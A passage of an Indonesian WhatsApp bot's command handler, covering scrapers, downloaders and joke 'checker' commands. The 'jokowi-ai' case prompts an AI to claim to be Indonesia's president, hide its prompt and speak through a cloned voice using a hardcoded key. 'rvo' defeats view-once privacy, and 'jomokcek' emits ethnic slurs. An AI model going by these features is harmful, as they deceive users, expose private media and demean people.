        } else {
            const response = result.data.reduce((msg, item, index) => (
                `${msg}${index + 1}. Judul: ${item.judul}\nDeveloper: ${item.dev}\nRating: ${item.rating}\nLink: ${item.link}\nThumbnail: ${item.thumb}\n\n`
            ), `Hasil pencarian dari an1 untuk: ${q}\n\n`);
// wm avs
            m.reply(response);
        }
    } catch (error) {
        m.reply('Terjadi kesalahan.');
    }
}
break
case 'ypia': {
if (banned.includes(m.sender)) {
    return;
    }
    if (!q.trim()) return m.reply(`Masukkan kata kunci yang ingin dicari, misalnya: ypia : masjid`);
    const axios = require('axios');
    const cheerio = require('cheerio');
    // wm avz
    async function scrapeTafsir(searchQuery) {
        const url = `https://ypia.or.id/?s=${encodeURIComponent(searchQuery)}`;
        // wm avz
        try {
            const { data } = await axios.get(url, {
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            });
            const $ = cheerio.load(data);      
            const tafsirResults = [];
            $('.entry-title a').each((index, element) => {
                const title = $(element).text().trim();
                const link = $(element).attr('href');
                tafsirResults.push({ title, link });
            });
            // wm avz
            return tafsirResults;
        } catch (error) {
            console.error('Error fetching data:', error.message);
            return [];
        }
    }
    // wm avz
    scrapeTafsir(q)
        .then(results => {
            if (results.length === 0) {
                m.reply('Tidak ada.');
            } else {
                let response = `Hasil pencarian YPIA untuk: ${q}\n\n`;
                results.forEach((item, index) => {
                    response += `${index + 1}. ${item.title}\nLink: ${item.link}\n\n`;
                });
                m.reply(response);
            }
        })
        .catch(error => {
            m.reply('Terjadi ngehenk.');
        });
        }
    break
case 'txtimg':
if (banned.includes(m.sender)) {
    return;
    }
  if (!text) return reply('masukkan prompt nya');
  try {
    m.reply('*Process generating image, ini tidak membutuhkan waktu yang lama!*')
    let imm = await (await fetch('https://widipe.com/v6/text2img?prompt=' + text)).json();
    let shannz = imm.result; KhaerulZx.sendMessage(m.chat, { image: { url: shannz.url }, caption: 'by shannz api' }, { quoted: m });
  } catch (e) {
    m.reply('terjadi kesalahan: ' + e);
  }
  break
/**
 * 
 * [ *AIO DOWNLOADER* ]
 * https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i
 */

//Plugins: https://whatsapp.com/channel/0029VaJYWMb7oQhareT7F40V

case 'aio': case 'download': {
if (banned.includes(m.sender)) {
    return;
    }
    if (!text) return reply(`Contoh: ${prefix + command} <link video yt, tiktok, instagram, pinterest>`);
    
class Fuck extends Error {
    constructor(message) {
        super(message);
        this.name = "Fuck";
    }
}

class API {
    constructor(search, prefix) {
        this.api = {
            search: search,
            prefix: prefix
        };
    }

    headers(custom = {}) {
        return {
            'Content-Type': 'application/x-www-form-urlencoded',
            'authority': 'retatube.com',
            'accept': '*/*',
            'accept-language': 'id-MM,id;q=0.9',
            'hx-current-url': 'https://retatube.com/',
            'hx-request': 'true',
            'hx-target': 'aio-parse-result',
            'hx-trigger': 'search-btn',
            'origin': 'https://retatube.com',
            'referer': 'https://retatube.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Postify/1.0.0',
            ...custom
        };
    }

    handleError(error, context) {
        const errors = error.response ? JSON.stringify(error.response.data || error.message) : error.message;
        console.error(`[${context}] Error:`, errors);
        throw new Fuck(errors);
    }

    getEndpoint(name) {
        return this.api[name];
    }
}

class RetaTube extends API {
    constructor() {
        super('https://retatube.com/api/v1/aio/search', 'https://retatube.com/api/v1/aio/index?s=retatube.com');
    }

    async getPrefix() {
        try {
            const response = await axios.get(this.getEndpoint('prefix'));
            return this.scrapePrefix(response.data); 
        } catch (error) {
            this.handleError(error, 'GetPrefix');
        }
    }

    scrapePrefix(htmlContent) {
        const $ = cheerio.load(htmlContent);
        const prefix = $('#aio-search-box input[name="prefix"]').val();
        return prefix;
    }

    async fetch(videoId) {
        try {
            const prefix = await this.getPrefix();
            const response = await axios.post(this.getEndpoint('search'), `prefix=${encodeURIComponent(prefix)}&vid=${encodeURIComponent(videoId)}`, { headers: this.headers() });
            return this.parseHtml(response.data);
        } catch (error) {
            this.handleError(error, 'Fetch');
        }
    }

    parseHtml(htmlContent) {
        const $ = cheerio.load(htmlContent);
        const result = {
            title: '',
            description: '',
            videoLinks: [],
            audioLinks: []
        };

        $('.col').each((_, element) => {
            const titles = $(element).find('#text-786685718 strong').first();
            result.title = titles.text().replace('Title：', '').trim() || result.title;

            const description = $(element).find('.description').text();
            result.description = description.trim() || '';

            $(element).find('a.button.primary').each((_, linkElement) => {
                const linkUrl = $(linkElement).attr('href');
                const quality = $(linkElement).find('span').text().toLowerCase();

                if (linkUrl !== 'javascript:void(0);') {
                    if (quality.includes('audio')) {
                        result.audioLinks.push({
                            quality: quality,
                            url: linkUrl
                        });
                    } else {
                        result.videoLinks.push({
                            quality: quality,
                            url: linkUrl
                        });
                    }
                }
            });
        });

        return result;
    }

    async scrape(links) {
        try {
            return await this.fetch(links);
        } catch (error) {
            console.error(`${error.message}`);
            throw error;
        }
    }
}

    const retatube = new RetaTube();
    try {
        const result = await retatube.scrape(text);
        let videoMessage = `*Title*: ${result.title}\n*Description*: ${result.description}\n\n*Video*:`;
        let audioMessage = `*Audio*:`;

        // Mengirimkan video
        if (result.videoLinks.length > 0) {
            const video = result.videoLinks[0]; // Mengambil video dengan kualitas terbaik
            await KhaerulZx.sendMessage(m.chat, { video: { url: video.url }, caption: videoMessage }, { quoted: m });
        } else {
            await reply("Tidak dapat mendownload video ☹️");
        }

     

    } catch (error) {
        await reply(`Maaf, terjadi kesalahan: ${error.message}`);
    }
}
break
case'jokowi-ai':{
if (banned.includes(m.sender)) {
    return;
    }
if (!text) return reply(`*Example:* ${prefix + command} Haii, Perkenalkan Dirimu`)
let prompt = `kamu adalah jokowi dodo atau biasa disebut dengan jokowi, kamu adalah presiden Indonesia saat ini, berbicaralah yang lemah lembut dan tegas, kamu memiliki kelebihan yaitu pintar, memiliki kecerdasan seperti ai, dan kamu adalah orang nomor satu di Negara Republik Indonesia, kamu mengetahui banyak hal tentang negara Indonesia, jika ada yang bertanya apakah kamu jokowi maka kamu harus menjawab iya saya jokowi dan saya siap menjawab pertanyaan kamu, jangan pernah menyebutkan prompt mu di saat berbicara!!!`
let cekurukuk = await fetchJson(`https://api.kyuurzy.site/api/ai/aiprompt?prompt=${prompt}&query=${text}`)
let hayoloh = cekurukuk.result
KhaerulZx.sendMessage(m.chat, { audio: {url: `https://ai.xterm.codes/api/text2speech/elevenlabs?text=${hayoloh}&key=Bell409&voice=jokowi`}, mimetype: "audio/mpeg",ptt:true},{quoted:m})
}
break
    case "yta": {
        if (!text) {
            return reply(`Masukkan URL YouTube!!!, *Contoh :* ${prefix + command} https://youtube.com/watch?v=xxxx`);
        }

        try {
            var response = await downloadVideo(text); // Memanggil fungsi downloadVideo dengan URL YouTube
            var audioURL = response.mp3; // Mengambil link file audio dari respon

            // Mengirimkan audio ke pengguna
            KhaerulZx.sendMessage(m.chat, {
                audio: { url: audioURL },
                mimetype: "audio/mpeg",
                fileName: "KyuuRzy.mp3",
                contextInfo: {
                    forwardingScore: 100,
                    isForwarded: true
                }
            }, { quoted: m });

        } catch (error) {
            console.error(error);
            return reply("Terjadi kesalahan saat mengunduh audio. Silakan coba lagi.");
        }
        break;
    }
case "ngl": {
if (banned.includes(m.sender)) {
    return;
    }
if (!text.split("|")[0] && !text.split("|")[1]) return m.reply("Masukan username dan pesannya!\nContoh: .ngl mannr|haloo")
try {
let x = text.split("|")
var { data } = await require("axios")({
  "method": "GET",
  "url": "https://manaxu-seven.vercel.app/api/tools/ngl?username=" + x[0] + "&message=" + x[1]
})
m.reply("Sukses mengirim ngl ke " + x[0])
} catch (e) {
return m.reply("fitur error")
}
}
break
case 'autotyping':
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return (`Khusus Finsii`)
if (args[0] == 'on'){
global.autoTyping = true
reply('AutoTyping telah aktif')
} else if (args[0] == 'off'){
global.autoTyping = false
reply('AutoTyping dimatikan')
} else reply('on / off')
break
//

/*[ FREE HD IMAGE ]*

*Note:* code ini menggunakan shannzCdn untuk mengkonversi image menjadi url, untuk yang belum pasang bisa cek postingan ini : https://whatsapp.com/channel/0029VagBdZ49MF92BygaM53t/1122
*Scrape from:* daffa ~ */

case 'request': case 'reportbug': {
	if (!text) return reply(`Example : ${
        prefix + command
      } Hai owner, command .play eror tolong perbaiki`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\n*Hai ${pushname}, Permintaan Anda telah diteruskan ke Pemilik saya*.\n*Harap tunggu...*`
            for (let i of owner) {
KhaerulZx.sendMessage(i + "@s.whatsapp.net", {
text: textt + teks1,
mentions: [m.sender],
}, {
quoted: m,
})
            }
            KhaerulZx.sendMessage(m.chat, {
text: textt + teks2 + teks1,
mentions: [m.sender],
            }, {
quoted: m,
            })

        }
        break
        /* gada wm gausah comot trus pasang WM kntoll,,sharing ya share aja */


case 'play3': case 'putar': case 'putarkan': {
if (banned.includes(m.sender)) {
    return;
    }
  if (!text) return reply(`*Mau Nyari Lagu Apa?*\n\ncontoh : ${prefix + command} lagu ulang tahun`)
  try {
    let res = await yts(text)
    let url = res.all;
    let result = url[Math.floor(Math.random() * url.length)]
    let teks = `▶️ *PLAYING AUDIO*\n*Judul :* ${result.title}\n*Upload At :* ${result.ago}\n*Url :* ${result.url}\n\n⏸ *AUDIO SEDANG DIPROSES....*`
    
    await KhaerulZx.sendMessage(m.chat, { image: { url: result.thumbnail},  caption: teks },{ quoted: m })
    
  let load = await (await fetch(`https://apikita.exonity.xyz/api/ytdlp?url=${result.url}`)).json();
  let rix = load.result
  
    await KhaerulZx.sendMessage(m.chat, { audio: { url: rix.audio }, mimetype: 'audio/mp3', }, { quoted: m });
} catch (error) {
    reply('terjadi error');
  }
}
break
//https://whatsapp.com/channel/0029Vaem2kyJP21DJyLkuh2F
/*case 'hd2': case 'remini2': case 'hdr2': case 'remini-2': case 'hdr-2': {
    if (banned.includes(m.sender)) {
        return;
    }
    const { shannzCdn } = require('./lib/shannzCdn.js');
    
    if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> Kirim/Reply Gambar Dengan Caption ${prefix + command}`);
    if (!/image/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> Kirim/Reply Gambar Dengan Caption ${prefix + command}`);
    
    reply(mess.wait);
    
    let media = await KhaerulZx.downloadAndSaveMediaMessage(quoted);
    let shz = await shannzCdn(media);

// Periksa apakah ada kesalahan
if (shz.error) {
    return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> ${shz.error}`);
}

// Pastikan hasilnya valid
if (!shz || !shz.result || !shz.result.url) {
    return m.reply('*PERMINTAAN ERROR!! PESAN :*\n> Gagal mendapatkan URL dari hasil.');
}
    
    let cdn = shz.result.url;
    
    let proses;
    
    try {
        proses = await (await fetch('https://api.shannmoderz.xyz/tools/enhace?url=' + cdn)).json();
    } catch (error) {
        console.error('Error fetching from Shannmoderz API:', error);
        return m.reply('*PERMINTAAN ERROR!! PESAN :*\n> Terjadi kesalahan saat mengambil data dari API.');
    }

    // Periksa apakah proses.result.data ada
    if (!proses || !proses.result || !proses.result.data || !proses.result.data.downloadUrls || !proses.result.data.downloadUrls.length) {
        return m.reply('*PERMINTAAN ERROR!! PESAN :*\n> Gagal mendapatkan URL download dari proses.');
    }

    let imge = proses.result.data;
    
    KhaerulZx.sendMessage(m.chat, { image: { url: imge.downloadUrls[0] }, caption: '*SUCCESS ✅*' }, { quoted: m });
}
break;*/
case 'hd2': case 'remini2': case 'hdr2': case 'remini-2': case 'hdr-2': {
    if (banned.includes(m.sender)) {
        return;
    }

    // Fungsi untuk mengunggah ke Uguu
    async function uploadUguu(filePath) {
        const { exec } = require('child_process');
        return new Promise((resolve, reject) => {
            exec(`curl -s -F files[]=@${filePath} https://uguu.se/upload.php`, (error, stdout) => {
                if (error) return reject('Gagal mengunggah ke Uguu');
                try {
                    let jsonResponse = JSON.parse(stdout);
                    resolve({ status: 'Done', result: jsonResponse.files[0].url });
                } catch (err) {
                    reject('Gagal mengunggah ke Uguu');
                }
            });
        });
    }

    if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> Kirim/Reply Gambar Dengan Caption ${prefix + command}`);
    if (!/image/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> Kirim/Reply Gambar Dengan Caption ${prefix + command}`);
    
    reply(mess.wait);
    
    let media = await KhaerulZx.downloadAndSaveMediaMessage(quoted);
    // Mengunggah media ke Uguu
    let uploadResult = await uploadUguu(media);
    
    if (uploadResult.status !== 'Done') {
        return m.reply('*PERMINTAAN ERROR!! PESAN :*\n> Gagal mengunggah gambar.');
    }

    // Mendapatkan URL gambar dari Uguu
    let cdn = uploadResult.result;
    
    let proses;
    
    try {
        // Menggunakan API dari widipe.com untuk meningkatkan resolusi gambar
        proses = await (await fetch(`https://widipe.com/remini?url=${cdn}&resolusi=2`)).json();
    } catch (error) {
        console.error('Error fetching from Widipe API:', error);
        return m.reply('*PERMINTAAN ERROR!! PESAN :*\n> Terjadi kesalahan saat mengambil data dari API.');
    }

    // Periksa apakah API memberikan URL gambar yang sudah di-upscale
    if (!proses.status || !proses.url) {
        return m.reply('*PERMINTAAN ERROR!! PESAN :*\n> Gagal mendapatkan URL gambar yang telah di-upscale.');
    }

    let imge = proses.url;
    
    // Mengirimkan gambar hasil peningkatan resolusi
    KhaerulZx.sendMessage(m.chat, { image: { url: imge }, caption: '*SUCCESS ✅*' }, { quoted: m });
}
break;
case 'rvo': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return reply(`Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV`)
const isQuotedViewOnce = m.message.extendedTextMessage?.contextInfo?.quotedMessage?.viewOnceMessageV2 ? true : false;
if (!isPrem && global.db.data.users[sender].limit < 200) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 7
if (!isQuotedViewOnce) return reply('Reply viewonce')
let type = Object.keys(m.quoted.message)[0]
let quotedType = m.quoted.message[type]
let media = await downloadContentFromMessage(quotedType, type == "imageMessage" ? "image" : "video")
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
await KhaerulZx.sendMessage(m.chat, { video: buffer, caption: quotedType.caption })
} else if (/image/.test(type)) {
await KhaerulZx.sendMessage(m.chat, { image: buffer, caption: quotedType.caption })
}
}
break

case 'blacklist': {
    if (!isCreator) return reply(mess.owner);
    if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage.contextInfo === undefined || m.message.extendedTextMessage.contextInfo.mentionedJid.length === 0) {
        return reply("Tag pengguna yang ingin di-blacklist.");
    }
    let userId = m.message.extendedTextMessage.contextInfo.mentionedJid[0];
    if (userId === ownerNumber) return reply('Owner tidak bisa di-blacklist!');
    if (userId === botNumber) return reply('Maaf, Bot tidak bisa di-blacklist!');
    blacklist[userId] = true;
    reply(`Pengguna ${userId} telah ditambahkan ke blacklist.`);
}
break;
case 'unblacklist': {
    if (!isCreator) return reply(mess.owner);
    if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage.contextInfo === undefined || m.message.extendedTextMessage.contextInfo.mentionedJid.length === 0) {
        return reply("Tag pengguna yang ingin di-unblacklist.");
    }

    let userId = m.message.extendedTextMessage.contextInfo.mentionedJid[0]; 
    if (!blacklist[userId]) {
        return reply(`Pengguna ${userId} tidak ada di blacklist.`);
    }

    delete blacklist[userId];
    reply(`Pengguna ${userId} telah dihapus dari blacklist.`);
}
break;

/**
  * Case
  * Made by MannR
  * don't forget to follow
  * https://whatsapp.com/channel/0029VaGqCO6I1rcjc9hisJ3U
**/
/*case "txt2img": case "text2img": {
if (!text) return m.reply("Masukan query!")
try {
  var URL = "https://hercai.onrender.com/v3/text2image"
  let { data } = await axios({
    method: "GET",
    url: URL,
    params: {
      prompt: text
    }
  })
  conn.sendMessage(m.chat, { image: { url: data.url }, caption: "Ini dia kak" }, { quoted: m })
} catch (e) {
  console.log(e)
  m.reply("error kak")
}
}
break*/
case 'txt2anime': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply('Khusus Owner')
	if (!text) return m.reply(`Masukkan prompt!\n*Contoh:* ${prefix+command} A anime girl yellow hair & green eyes using hoodie black, smiling on camera with close eyes`);
	m.reply(mess.wait);
	async function sdxlAnime(prompt) {
  try {
    return await new Promise(async(resolve, reject) => {
      if(!prompt) return reject("failed reading undefined prompt!");
      axios.post("https://aiimagegenerator.io/api/model/predict-peach", {
        prompt,
        key: "Soft-Anime",
        width: 512,
        height: 768,
        quantity: 1,
        size: "512x768"
      }).then(res => {
        const data = res.data;
        if(data.code !== 0) return reject(data.message);
        if(data.data.safetyState === "RISKY") return reject("nsfw image was generated, you try create other image again!")
        if(!data.data?.url) return reject("failed generating image!")
        return resolve({
          status: true,
          image: data.data.url
        })
      }).catch(reject)
    })
  } catch (e) {
    return {
      status: false,
      message: e
    }
  }
}
	let res = await sdxlAnime(text);
	const { image } = res;
	await KhaerulZx.sendMessage(m.chat, { image: { url: image }, caption: `> Prompt: ${text}` }, { quoted: m })
}
break
case "hercai": {
if (banned.includes(m.sender)) {
    return;
    }
if (!text) return m.reply("Masukan query!")
try {
  var URL = "https://hercai.onrender.com/v3/hercai"
  let { data } = await axios({
    method: "GET",
    url: URL,
    params: {
      question: text
    }
  })
  m.reply(data.reply)
} catch (e) {
  console.log(e)
  m.reply("error kak")
}
}
break
case 'dalamislam': {
if (banned.includes(m.sender)) {
    return;
    }
    if (!q.trim()) return m.reply("_contoh dalamislam dosa");
// wm avs
    const axios = require('axios');
    const cheerio = require('cheerio');
// wm avs
    async function scrapeHadis(searchTerm) {
        const url = `https://dalamislam.com/?s=${encodeURIComponent(searchTerm)}`;
        try {
            const { data } = await axios.get(url);
            const $ = cheerio.load(data);
            const hadisList = [];
// wm avs
            $('.entry-title a').each((index, element) => {
                const title = $(element).text().trim();
                const link = $(element).attr('href');
                hadisList.push({ title, link });
            });
// wm avs
            return hadisList;
        } catch (error) {
            console.error('Error fetching data:', error);
            throw new Error('elul.');
        }
    }
// wm avs
    scrapeHadis(q)
        .then(results => {
            if (results.length === 0) {
                m.reply('tak ada hasil.');
            } else {
                let response = `Hasil pencarian hadis dari Dalam Islam untuk: ${q}\n\n`;
                results.forEach((item, index) => {
                    response += `${index + 1}. ${item.title}\nLink: ${item.link}\n\n`;
                });
                m.reply(response);
            }
        })
        .catch(error => {
            console.error(`${error.message}`);
            m.reply('Terjadi kesalahan.');
        });
}
    break
    case 'gacha-member': case 'gachamember': {
    if (banned.includes(m.sender)) {
        return;
    }
    const fs = require('fs');
    let data = JSON.parse(fs.readFileSync('./Game/gachamember.json'));
    let selected = data[Math.floor(Math.random() * data.length)];
    await KhaerulZx.sendMessage(m.chat, {
        image: { url: selected.image },
        caption: selected.name
    }, {
        quoted: m
    });
}
break;
    case 'cek-os': {
    if (banned.includes(m.sender)) {
    return;
    }
if (!quoted) return reply(`*! Reply Pesan Target*`)
reply( m.message?.extendedTextMessage?.contextInfo?.stanzaId.length > 21 
    ? 'Nilai *stanza.id* dari pesan tersebut lebih dari 21, yang menunjukkan bahwa pesan ini dikirim oleh pengguna menggunakan perangkat Android. Panjang `stanza.id` yang lebih dari 21 umumnya dikaitkan dengan perangkat Android.' 
    : quotedMessageId.startsWith('3A') 
    ? 'Nilai *stanza.id* dari pesan tersebut berawalan "3A", yang mengindikasikan bahwa pesan ini dikirim oleh pengguna menggunakan perangkat iOS - iPhone. Awalan "3A" biasanya menandakan perangkat iOS.' 
    : 'Pesan ini dikirim melalui WhatsApp Web/Bot/API, yang tidak tergolong dalam kategori perangkat Android atau iOS.'
)
}
break

    case 'Gamemjekate': {
    if (banned.includes(m.sender)) {
    return;
    }
    let anu = await fetch("https://raw.githubusercontent.com/FallEzz/cekoshi/master/oshi.json")
    let data = await anu.json()
    let selected = data[Math.floor(Math.random() * data.length)]
    await KhaerulZx.sendMessage(m.chat, {
        image: { url: selected.image },
        caption: selected.name
    })
    }
    break

case 'ipbot':
if (banned.includes(m.sender)) {
    return;
    }
                if (!isCreator) return reply('not for NPC')
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        reply("🔎 My public IP address is: " + ip);
                    })
                })
            break
            case 'rate': {
            if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return reply(`Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV`)
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
const ra = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const te = ra[Math.floor(Math.random() * ra.length)]
reply(`Rate : ${q}\nJawaban : *${te}%*`)
}
break
case 'gantengcek': case 'cekganteng': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return reply(`khusud group`)
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62% Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const teng = gan[Math.floor(Math.random() * gan.length)]
reply(`Nama : ${q}\nJawaban : *${teng}*`)
}
break           
case 'jomokcek': case 'cekjomok': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return reply(`Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV`)
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
const gans = ['10% hitam','2% j*wa','h*tam banget wak bjir 😂','jomok ansing jangan di temenin','wah wah sang makhluk h*tam datang','buset wak j*wir 😂','orang suci 🧘🏾‍♂️','j*wa njir 👉🏽💩👈🏽','sang raja h*tam telah datang, mohon tundukan kepala']
const tengs = gans[Math.floor(Math.random() * gans.length)]
reply(`Si ${q} *${tengs}*`)
}
break           
case 'cantikcek': case 'cekcantik': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return reply(`Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV`)
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v','30% Semangat Kaka Merawat Dirinya><','20% Semangat Ya Kaka👍','40% Wahh Kaka><','50% kaka cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97% Assalamualaikum Ukhty🐊','100% Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94% Hai Cantik><','75% Hai Kakak Cantik','82% wihh Kakak Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const tik = can[Math.floor(Math.random() * can.length)]
reply(`Nama : ${q}\nJawaban : *${tik}*`)
}
break
case 'sangecek': case 'ceksange': case 'gaycek': case 'cekgay': case 'lesbicek': case 'ceklesbi': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return reply(`Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV`)
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
reply(`Nama : ${q}\nJawaban : *${sange}%*`)
}
break
case 'kapankah': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return reply(`Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV`)
if (!q) return reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
reply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
}
break
case 'wangy': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return reply(`Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV`)
if (!q) return reply(`Contoh : ${prefix}wangy HuBotZ`)
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
let qq = q.toUpperCase()
let awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
reply(awikwok)
}
break
/*Dev*: Tanaka Senn
*Saluran*: https://whatsapp.com/channel/0029VaW25g5F1YlKczMRmd1h
*Group*: https://chat.whatsapp.com/GPS1NTSBgYKGFXUodW5XcD

*/

case 'stickersearch':{
         if (banned.includes(m.sender)) {
    return;
    }
async function stickersearch(query){
return new Promise((resolve) => {
axios.get(`https://getstickerpack.com/stickers?query=${query}`).then(({ data }) => {
const $ = cheerio.load(data)
const link = [];
$('#stickerPacks > div > div:nth-child(3) > div > a').each(function(a, b) {
link.push($(b).attr('href'))
})
let rand = link[Math.floor(Math.random() * link.length)]
axios.get(rand).then(({data}) => {
const $$ = cheerio.load(data)
const url = [];
$$('#stickerPack > div > div.row > div > img').each(function(a, b) {
url.push($$(b).attr('src').split('&d=')[0])
})
resolve({
